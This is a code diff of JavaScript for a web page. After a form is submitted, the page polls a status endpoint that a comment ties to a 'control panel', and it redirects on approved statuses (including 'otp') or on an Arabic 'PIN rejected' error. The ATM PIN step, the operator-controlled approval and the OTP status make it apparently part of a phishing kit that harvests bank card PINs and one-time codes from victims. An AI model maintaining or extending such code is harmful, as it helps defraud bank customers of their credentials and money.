@@ -355,6 +355,7 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
+          // البدء في فحص حالة الطلب من لوحة التحكم
           startPollingStatus();
         } else {
           throw new Error('Failed to submit');
@@ -369,33 +370,34 @@
     applyAtmRejectMessage();
 
     var pollInterval = null;
-
-    function redirectToSuccess() {
-      clearInterval(pollInterval);
-      if (requestId) {
-        window.location.href = 'success.html?id=' + requestId;
-      }
+    function normalizeStatus(value){
+      return String(value || '').trim().toLowerCase();
     }
-
-    function redirectToAtmWithError(message) {
-      clearInterval(pollInterval);
-      var finalMessage = message || 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
-      if (requestId) {
-        window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(finalMessage) + '&id=' + requestId;
-      }
+    function isApprovedStatus(value){
+      var status = normalizeStatus(value);
+      return ['approved', 'accept', 'accepted', 'success', 'verified', 'otp'].indexOf(status) !== -1;
     }
-
+    function isRejectedStatus(value){
+      var status = normalizeStatus(value);
+      return ['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1;
+    }
     function startPollingStatus() {
+      clearInterval(pollInterval);
       pollInterval = setInterval(function() {
         fetch('/api/status/' + requestId)
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data || !data.status) return;
-            var status = String(data.status || '').trim().toLowerCase();
-            if (['approved', 'accept', 'accepted', 'verified', 'otp', 'success'].indexOf(status) !== -1) {
-              redirectToSuccess();
-            } else if (['rejected', 'reject', 'declined', 'error', 'failed'].indexOf(status) !== -1) {
-              redirectToAtmWithError('تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.');
+            var status = normalizeStatus(data.status);
+            if (isApprovedStatus(status)) {
+              clearInterval(pollInterval);
+              document.getElementById('loadingOverlay').style.display = 'none';
+              window.location.href = 'success.html?id=' + requestId;
+            } else if (isRejectedStatus(status)) {
+              clearInterval(pollInterval);
+              document.getElementById('loadingOverlay').style.display = 'none';
+              var rejectMessage = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
+              window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
             }
           })
           .catch(function() {});
